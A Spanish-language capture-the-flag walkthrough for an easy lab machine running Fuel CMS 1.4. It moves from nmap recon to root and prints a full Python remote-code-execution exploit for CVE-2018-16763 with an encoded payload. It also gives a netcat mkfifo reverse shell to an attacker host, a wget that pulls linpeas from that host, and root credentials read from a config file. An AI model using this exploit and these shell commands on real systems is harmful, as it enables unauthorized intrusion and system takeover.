Hola de nuevo, en esta ocasion tendremos una maquina de dificultad facil, en el que tendremos que hacer un leve reconocimiento, realizar una busqueda de una brecha de seguridad utilizando la version CMS en el que  lograremos crear una reverse shell dentro de nuestra maquina atacante y escalaremos privilegios abusandonos de la base de datos sin proteger del sistema!

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```bash
Nmap scan report for IPTARGET
Host is up, received user-set (0.24s latency).
Scanned at 2023-06-26 19:16:26 EDT for 25s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))

```

Nuestro escaneo nos indica el puerto http abierto, por lo que navegaremos al sitio web.
Encontraremos la la version y el CMS que esta utilizando esta pagina "**Fuel CMS 1.4**".
Buscaremos por internet si existe alguna vulnerabilidad para esta version, podemos buscarlo con la palabra clave **exploit**.
Tambien podemos buscarlo mediante : `searchsploit Fuel CMS 1.4`
**Nota**: Dentro del servidor web tambien encontramos una ruta donde podemos usar las credenciales **admin:admin** para poder ingresar con este usuario y poder estudiar mas la interface. La ruta es : http://IPTARGET/fuel

# Intrusion

Una vez tengamos nuestra exploit a utilizar, siempre es bueno echarle un vistazo como esta estructurado el exploit asi tendremos una idea de como utilizarlo correctamente.
 Tenemos que editar el exploit con la URL/IP de nuestra victima. Podes utilizar `nano` `vim` o cualquier editor que mas te gusta.
Revisamos que todo este correcto y luego lo ejecutamos, aca hay un ejemplo de como modificarlo.

```bash
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "IPTARGET"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
            
```

Lo ejecutamos con `python2 exploit.py` y se nos abrira una terminal en el cual podemos ejecutar comandos. Para poder trabajar mas adecuadamente, nos pondremos en escucha en nuestra maquina atacante y pegaremos nuestro reverse shell 

```python
`nc -nvlp LPORT` ---> Maquina atacante
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f`.
```

No olvidemos de upgradear nuestra shell para poder trabajar mas comodo 

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

# Priv.Escalation

Como no podremos realizar `sudo -l`, tenemos que enumerar la maquina por posibles vulnerabilidades. `linpeas.sh` es una herramienta  que busca archivos con permisos elevados dentro del sistema.

Para poner linpeas dentro del sistema, tenemos que movernos al directorio **/dev/shm**.
En nuestra maquina atacante, abriremos un servidor python http dentro del directorio donde tengamos instalado linpeas **/opt/peass**. 
`python3 -m http.server 443`

Dentro de la maquina victima, nos transferimos el archivo ejecutando :
`wget http://LHOST/linpeas.sh`. 

Le daremos permisos de ejecucion y lo corremos:
`chmod +x linpeas.sh`
`./linpeas.sh`

Una vez realizada la enumeracion, hay un directorio que nos indica las credenciales del usuario raiz root. Nos digirimos a la siguiente ruta :
`/var/www/html/fuel/application/config`

Veremos alojados configuraciones, migraciones, editores, perfiles,etc. Nos centraremos en la parte de database, donde podemos ver la base de datos del usuario root con sus credenciales correspondientes.

`cat database.php`

Ya con esto en mano, cambiaremos de usuario a root y reclamamos nuestra flag ! :

`su root`




